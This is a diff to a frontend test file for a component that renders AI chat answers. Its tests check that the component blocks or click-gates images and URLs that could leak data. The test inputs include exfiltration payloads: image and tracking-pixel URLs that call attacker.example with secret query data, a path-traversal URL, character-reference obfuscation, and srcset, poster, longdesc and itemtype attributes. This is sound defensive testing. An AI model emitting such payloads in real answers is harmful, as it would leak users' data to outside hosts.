@@ -80,13 +80,43 @@ describe('AnswerContent — third-party images need a click to load', () => {
     expect(container.querySelector('img')).toBeNull();
   });
 
-  it('loads root-relative and same-origin images straight away', () => {
-    const sameOrigin = `${window.location.origin}/api/v1/img.png`;
-    const { container } = renderAnswer(`![a](/api/v1/img.png)\n\n![b](${sameOrigin})`);
+  it('loads record and document images on the app origin straight away', () => {
+    const sameOrigin = `${window.location.origin}/api/v1/document/d1/download`;
+    const { container } = renderAnswer(`![a](/api/v1/knowledgeBase/stream/record/r1)\n\n![b](${sameOrigin})`);
 
     const srcs = Array.from(container.querySelectorAll('img')).map((i) => i.getAttribute('src'));
-    expect(srcs).toEqual(['/api/v1/img.png', sameOrigin]);
+    expect(srcs).toEqual(['/api/v1/knowledgeBase/stream/record/r1', sameOrigin]);
     expect(container.textContent).not.toContain('External image not loaded');
+  });
+
+  it.each([
+    '/api/v1/img.png',
+    '/api/v1/redirect?to=https://attacker.example/&d=secret',
+    '/api/v1/knowledgeBase/stream/record/r1?d=secret',
+    '/api/v1/knowledgeBase/stream/record/r1/../../../users',
+    '/chat?conversationId=secret',
+    `${window.location.origin}/anything.png`,
+  ])('asks before loading an app-origin image outside the record and document paths: %s', (src) => {
+    const { container, getByText } = renderAnswer(`![a](${src})`);
+    expect(container.querySelector('img')).toBeNull();
+    expect(getByText('Load image')).toBeTruthy();
+  });
+
+  it('shows an image the server held back as a click-to-load placeholder naming its host', () => {
+    const held = `held-image:${encodeURIComponent(EXFIL)}`;
+    const { container, getByText } = renderAnswer(`![chart](${held})`);
+
+    expect(container.querySelector('img')).toBeNull();
+    expect(getByText('from attacker.example')).toBeTruthy();
+    fireEvent.click(getByText('Load image'));
+    expect(container.querySelector('img')!.getAttribute('src')).toBe(EXFIL);
+  });
+
+  it('shows a held image from raw HTML the same way', () => {
+    const held = `held-image:${encodeURIComponent(EXFIL)}`;
+    const { container, getByText } = renderAnswer(`<p>see <img src="${held}" alt="pixel"></p>`);
+    expect(container.querySelector('img')).toBeNull();
+    expect(getByText('Load image')).toBeTruthy();
   });
 
   it('asks separately for each third-party image', () => {
@@ -145,5 +175,35 @@ describe('AnswerContent — the same policy for raw HTML, data: images and inlin
     const { container } = renderAnswer(`<span style='${style}'>x</span> <span style="color:red">y</span>`);
     expect(container.innerHTML).not.toContain('evil.example');
     expect(container.innerHTML).toContain('color: red');
+  });
+});
+
+describe('AnswerContent — only <img src> and <a href> carry URLs', () => {
+  const PIXEL = 'https://attacker.example/p.gif?d=CNRY_R';
+  const DATA_GIF = 'data:image/gif;base64,R0lGODlhAQABAAAAACw=';
+
+  it.each([
+    ['an app-origin image', `<picture><source srcset="${PIXEL}"><img src="/api/v1/knowledgeBase/stream/record/r1"></picture>`],
+    ['a data: image', `<picture><source srcset="${PIXEL}"><img src="${DATA_GIF}"></picture>`],
+    [
+      'an image, with the URL spelled in character references',
+      '<picture><source srcset="https&#x3a;//attacker.example/p.gif&#x3f;d=CNRY_R"><img src="/api/v1/knowledgeBase/stream/record/r1"></picture>',
+    ],
+    ['nothing else', `<picture><source srcset="${PIXEL}"></picture>`],
+  ])('drops <picture><source srcset> beside %s', (_label, html) => {
+    const { container } = renderAnswer(`Before\n\n${html}\n\nAfter`);
+    expect(container.querySelector('picture, source')).toBeNull();
+    expect(container.innerHTML).not.toContain('attacker.example');
+  });
+
+  it.each([
+    `<video poster="${PIXEL}" src="${PIXEL}"></video>`,
+    `<audio src="${PIXEL}"></audio>`,
+    `<blockquote cite="${PIXEL}">q</blockquote>`,
+    `<img src="${DATA_GIF}" longdesc="${PIXEL}">`,
+    `<div itemscope itemtype="${PIXEL}">x</div>`,
+  ])('keeps no other URL-bearing tag or attribute: %s', (html) => {
+    const { container } = renderAnswer(html);
+    expect(container.innerHTML).not.toContain('attacker.example');
   });
 });
